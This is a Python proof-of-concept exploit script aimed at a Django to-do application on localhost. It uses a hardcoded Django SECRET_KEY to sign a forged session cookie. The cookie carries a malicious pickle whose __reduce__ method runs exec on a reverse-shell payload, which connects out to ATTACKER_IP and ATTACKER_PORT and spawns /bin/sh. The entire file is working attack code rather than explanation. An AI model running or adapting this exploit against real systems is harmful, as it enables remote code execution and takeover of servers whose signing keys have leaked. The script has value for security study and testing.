import requests
from django.contrib.sessions.backends.signed_cookies import SessionStore
from django.conf import settings

# minimal settings needed to use django's code
settings.configure(
    SECRET_KEY='django-insecure-5ml-oij)*(#!l^(&)lub&gty@)u^09-u8g=&+6tb1fzu4l!to5',
    SESSION_ENGINE="django.contrib.sessions.backends.signed_cookies",
    SESSION_SERIALIZER='django.contrib.sessions.serializers.PickleSerializer'
)

# for the reverse shell
ATTACKER_IP = "127.0.0.1"
ATTACKER_PORT = 8888

LIST_URL = 'http://localhost:8000'

REVERSE_SHELL = f"""
import os, socket, pty
ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ss.connect(("{ATTACKER_IP}", {ATTACKER_PORT}))
for d in range(3):
    os.dup2(ss.fileno(), d)
pty.spawn('/bin/sh')
"""

# bad pickle
class MaliciousPickle:

    def __init__(self, payload):
        self.payload = payload

    def __reduce__(self):
        return exec, (self.payload,)


def forge_session_key():
    """Saves a malicious pickle to a session key/cookie"""
    session_store = SessionStore()
    session_store['TODO_LIST'] = MaliciousPickle(REVERSE_SHELL)
    session_store.save()
    return session_store.session_key


def main():
    with requests.Session() as client_session:
        client_session.cookies.set('sessionid', forge_session_key(), domain='localhost.local', path='/')
        client_session.get(LIST_URL)


if __name__ == "__main__":
    main()


